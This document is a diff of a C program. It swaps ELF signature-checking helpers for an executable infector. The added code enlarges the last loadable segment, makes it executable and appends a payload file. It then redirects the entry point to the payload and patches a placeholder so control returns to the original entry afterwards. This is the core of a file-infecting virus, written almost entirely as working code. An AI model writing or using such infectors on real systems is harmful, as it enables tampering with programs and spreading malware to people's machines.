@@ -3,77 +3,82 @@
 #include <elf.h>
 #include <stdio.h>
 #include <string.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <unistd.h>
 
-static int  check_if_elf(Elf64_Ehdr *elf)
+Elf64_Phdr *last_phdr(char *data)
 {
-    if (elf->e_ident[EI_MAG0] != ELFMAG0 ||
-        elf->e_ident[EI_MAG1] != ELFMAG1 ||
-        elf->e_ident[EI_MAG2] != ELFMAG2 ||
-        elf->e_ident[EI_MAG3] != ELFMAG3)
-        return 0;
-    if (elf->e_ident[EI_CLASS] != ELFCLASS64)
-        return 0;
-    return 1;
-}
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)(data);
+    Elf64_Phdr *phdrs = (Elf64_Phdr *)(data + ehdr->e_phoff);
 
-static int  find_note_section(Elf64_Shdr *shdr, size_t shnum, Elf64_Shdr **note_shdr)
-{
-    for (size_t i = 0; i < shnum; i++)
+    
+    Elf64_Phdr *target = NULL;
+    
+    int i = 0;
+    while(i < ehdr->e_phnum)
     {
-        if (shdr[i].sh_type == SHT_NOTE)
-        {
-            *note_shdr = &shdr[i];
-            return 1;
-        }
+        if (phdrs[i].p_type == PT_LOAD)
+            target = &phdrs[i];
+        i++;
     }
-    return 0;
+    return target;
 }
 
 
-int     is_signed(char *adress, size_t lenght)
+uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
 {
-    size_t lenght_of_string = strlen(SIGNATURE);
-    Elf64_Ehdr *elfh = (Elf64_Ehdr *)adress;
-    Elf64_Shdr *shdr;
-    Elf64_Shdr *note_shdr = NULL;
-    Elf64_Off note_offset = 0;
+    
+    Elf64_Phdr *target = last_phdr(data);
+    Elf64_Addr new_entry = target->p_vaddr + target->p_filesz;
 
-    if (lenght < sizeof(Elf64_Ehdr))
-        return 0;
-    if (check_if_elf(elfh) == 0)
-        return 0;
-    if (elfh->e_shoff > lenght || elfh->e_shentsize != sizeof(Elf64_Shdr))
-        return 0;
-    if (elfh->e_shnum > (lenght - elfh->e_shoff) / sizeof(Elf64_Shdr))
-        return 0;
-    shdr = (Elf64_Shdr *)(adress + elfh->e_shoff);
-    if (find_note_section(shdr, elfh->e_shnum, &note_shdr) == 0)
-        return 0;
-    note_offset = note_shdr->sh_offset;
-    if (note_offset > lenght || lenght_of_string > lenght - note_offset)
-        return 0;
-    if (strncmp(adress + note_offset, SIGNATURE, lenght_of_string) != 0)
-        return 0;
-        
-    return 1;
+    target->p_flags |= PF_X;
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)data;
+
+    uint64_t or = target->p_filesz;
+    target->p_filesz += code_size;
+    target->p_memsz  += code_size;
+    uint64_t old_entry = ehdr->e_entry;
+    ehdr->e_entry = new_entry;
+    memmove(data + target->p_offset + or, code, code_size);
+
+    return old_entry;
 }
 
-int sign_file(char *adress, size_t lenght)
-{
-    size_t lenght_of_string = strlen(SIGNATURE);
 
-    if (lenght < sizeof(Elf64_Ehdr) || lenght < lenght_of_string)
-        return 0;
-    if (check_if_elf((Elf64_Ehdr *)adress) == 0)
-        return 0;
 
-    adress += lenght - lenght_of_string;
-    memcpy(adress, SIGNATURE, lenght_of_string);
-    return 1;
-}
 
 int main(void)
 {
-    scan_targets();
+    int fd = open("example", O_RDONLY);
+    int fd2 = open("payload.bin", O_RDONLY);
+
+    struct stat st;
+    struct stat st2;
+
+    fstat(fd, &st);
+    if (fstat(fd2, &st2) < 0)
+        perror("error\n");
+
+
+    char *data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    char *code = mmap(NULL, st2.st_size, PROT_READ, MAP_PRIVATE, fd2, 0);
+    close(fd);
+    close(fd2);
+
+    char *new = malloc(st.st_size + st2.st_size + 1);
+    
+    memcpy(new, data, st.st_size);
+
+    uint64_t entry = payload(new, st.st_size, code, st2.st_size);
+    uint64_t *patch = memmem(new, st.st_size + st2.st_size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
+    if (patch)
+        *patch = entry;
+
+    int out = open("test2", O_WRONLY | O_CREAT | O_TRUNC, 0755);
+write(out, new, st.st_size + st2.st_size);
+close(out);
+    
     return 0;
 }
